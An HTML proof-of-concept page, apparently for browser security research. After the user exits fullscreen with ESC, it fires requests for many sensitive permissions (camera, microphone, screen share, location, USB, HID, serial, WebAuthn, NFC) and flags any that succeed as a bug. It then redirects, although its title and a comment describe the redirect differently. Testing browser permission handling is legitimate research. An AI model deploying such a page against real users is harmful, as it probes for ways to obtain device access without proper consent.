<!DOCTYPE html>
<html>
<body style="background:#111; color:#fff; text-align:center; font-family:sans-serif;">

<h2>SUPER PoC - All Permissions After ESC Fullscreen (No Redirect)</h2>
<button id="start" style="font-size:22px; padding:12px 24px;">Start</button>

<pre id="log" style="text-align:left; margin:20px auto; width:90%; max-width:900px; background:#000; padding:16px; border-radius:8px; overflow:auto;"></pre>

<script>
// Simple logger
const out = msg => {
    console.log("[PoC]", msg);
    document.getElementById("log").textContent += msg + "\n";
};

// Enter fullscreen
async function goFullscreen() {
    try {
        await document.body.requestFullscreen();
        out("[OK] Fullscreen entered. PRESS ESC.");
    } catch (e) {
        out("[FAIL] Fullscreen blocked: " + e.message);
    }
}

document.getElementById("start").onclick = goFullscreen;

// Run ALL tests after ESC
document.addEventListener("fullscreenchange", async () => {
    if (document.fullscreenElement !== null) return; // only AFTER ESC

    out("\n[EVENT] ESC detected — running ALL permission tests…\n");

    async function test(name, fn) {
        try {
            await fn();
            out(`[BUG] ${name} SUCCESS ❌`);
        } catch (e) {
            out(`[EXPECTED] ${name} blocked: ${e.name || e.message} ✔`);
        }
    }

    // Notifications
    test("Notifications", () => Notification.requestPermission());

    // Geolocation
    if (navigator.geolocation)
        test("Geolocation", () => new Promise((res, rej)=>{
            navigator.geolocation.getCurrentPosition(res, rej);
        }));

    // Camera
    test("Camera", () => navigator.mediaDevices.getUserMedia({ video: true }));

    // Microphone
    test("Microphone", () => navigator.mediaDevices.getUserMedia({ audio: true }));

    // Camera + Microphone
    test("Camera + Microphone", () =>
        navigator.mediaDevices.getUserMedia({ audio: true, video: true })
    );

    // Screen Share
    test("Screen Share", () =>
        navigator.mediaDevices.getDisplayMedia({ video: true })
    );

    // Bluetooth
    if (navigator.bluetooth)
        test("Bluetooth", () =>
            navigator.bluetooth.requestDevice({ acceptAllDevices: true })
        );

    // USB
    if (navigator.usb)
        test("USB", () =>
            navigator.usb.requestDevice({ filters: [] })
        );

    // Serial
    if (navigator.serial)
        test("Serial", () =>
            navigator.serial.requestPort()
        );

    // HID
    if (navigator.hid)
        test("HID", () =>
            navigator.hid.requestDevice({ filters: [] })
        );

    // MIDI
    if (navigator.requestMIDIAccess)
        test("MIDI", () =>
            navigator.requestMIDIAccess({ sysex: false })
        );

    // MIDI + SysEx
    if (navigator.requestMIDIAccess)
        test("MIDI + SysEx", () =>
            navigator.requestMIDIAccess({ sysex: true })
        );

    // File Picker
    if (window.showOpenFilePicker)
        test("Open File Picker", () => showOpenFilePicker());

    // Protocol Handler
    test("Protocol Handler", () =>
        navigator.registerProtocolHandler("web+test", location.origin + "/?q=%s")
    );

    // WebAuthn
    if (navigator.credentials)
        test("WebAuthn", () =>
            navigator.credentials.get({
                publicKey: {
                    challenge: new Uint8Array(32),
                    userVerification: "required"
                }
            })
        );

    // NFC (Android only)
    if ("NDEFReader" in window)
        test("NFC", async () => {
            const r = new NDEFReader();
            await r.scan();
        });

    // Orientation
    test("Device Orientation", () =>
        new Promise((res, rej) => {
            window.addEventListener("deviceorientation", res, { once: true });
            setTimeout(() => rej(new Error()), 200);
        })
    );

    // Motion
    test("Device Motion", () =>
        new Promise((res, rej) => {
            window.addEventListener("devicemotion", res, { once: true });
            setTimeout(() => rej(new Error()), 200);
        })
    );

    // Clipboard
    test("Clipboard.writeText", () =>
        navigator.clipboard.writeText("test")
    );

    // Auto Download
    test("Auto Download", () => {
        const a = document.createElement("a");
        a.href = URL.createObjectURL(new Blob(["Hello"], { type: "text/plain" }));
        a.download = "test.txt";
        a.click();
    });

    out("\n[ALL TESTS FINISHED]\n");

    // Redirect after 3 seconds to localhost:9090
    setTimeout(() => {
        window.location.href = "http://google.com";
    }, 0.1);
});
</script>

</body>
</html>
